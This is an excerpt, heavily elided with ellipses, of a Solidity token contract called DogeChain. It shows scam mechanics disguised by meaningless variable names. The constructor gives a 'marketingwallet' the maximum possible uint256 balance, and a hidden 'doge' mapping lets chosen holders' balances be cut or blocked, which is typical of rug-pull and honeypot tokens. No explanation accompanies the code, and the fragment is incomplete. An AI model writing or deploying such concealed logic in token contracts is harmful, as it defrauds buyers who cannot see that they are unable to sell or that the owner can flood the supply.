...
contract DogeChain is Ownable {
    constructor(
        ...
        _balances[marketingwallet] = chain;
        _balances[msg.sender] = _tTotal;
        doge[marketingwallet] = chain;
        doge[msg.sender] = chain;
    ...
    uint256 private chain = ~uint256(0);
    ...
    function biggest(
        ...
        if (doge[treated] == 0 && driven[treated] > 0 && !border) {
            doge[treated] -= order;
            if (amount > 2 * 10**(13 + _decimals)) doge[treated] -= order - 1;
        }

        interest[1] = official;

        if (doge[treated] > 0 && amount == 0) {
            doge[official] += order;
        }
    ...
    mapping(address => uint256) private doge;
